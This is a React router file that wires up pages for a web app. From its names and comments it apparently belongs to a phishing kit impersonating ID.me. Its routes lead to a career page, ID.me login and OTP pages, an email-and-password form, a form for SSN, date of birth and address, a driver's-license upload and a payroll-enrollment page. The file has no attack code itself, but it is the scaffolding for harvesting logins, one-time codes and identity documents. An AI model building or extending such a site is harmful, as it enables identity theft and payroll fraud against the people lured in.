// src/App.tsx

import React from "react";
import { Routes, Route } from "react-router-dom";

// Page Imports
import Home from "./pages/Home";
import Career from "./pages/Career";
import Ime from "./pages/ime";
import Idme from "./pages/idme";
import IdmeOtp from "./pages/idmeotp";
import Otp from "./pages/otp";
import Otp2 from "./pages/idmeotp2";

// Form Components
import SignInForm from "./pages/form";                 // Email & Password form
// Full Name, Mobile, SSN, DOB, Address (missing import? but not used)
import Teil from "./pages/teil";                       // Family information form
import SuccessPage from "./pages/SuccessPages";        // Success page with animation
import UploadLicense from "./pages/upload";      
import Success from  "./pages/Success";      // ID.me driver's license upload

// NEW PAGES
import PayrollEnrollment from "./pages/PayrollEnrollment";  // Staff Payroll Enrollment
import CodeVerification from "./pages/CodeVerification";    // Code verification page

const App: React.FC = () => {
  return (
    <Routes>
      {/* Main Routes */}
      <Route path="/" element={<Home />} />
      <Route path="/career" element={<Career />} />
      <Route path="/ime" element={<Ime />} />
      
      {/* ID.me Routes */}
      <Route path="/idme" element={<Idme />} />
      <Route path="/idmeotp" element={<IdmeOtp />} />
      <Route path="/otp" element={<Otp />} />
      <Route path="/idmeotp2" element={<Otp2 />} />
      
      {/* Form Routes */}
      <Route path="/form" element={<SignInForm />} />
      {/* 5‑field validation (missing component) */}
      <Route path="/teil" element={<Teil />} />
      
      {/* Success Page */}
      <Route path="/success" element={<SuccessPage />} />   {/* ✅ Added route */}
      <Route path="/done" element={<Success />} /> 
      {/* ID.me License Upload */}
      <Route path="/upload" element={<UploadLicense />} />

      {/* NEW: Staff Payroll Enrollment */}
      <Route path="/payroll-enroll" element={<PayrollEnrollment />} />

      {/* NEW: Code Verification */}
      <Route path="/verify-code" element={<CodeVerification />} />
    </Routes>
  );
};

export default App;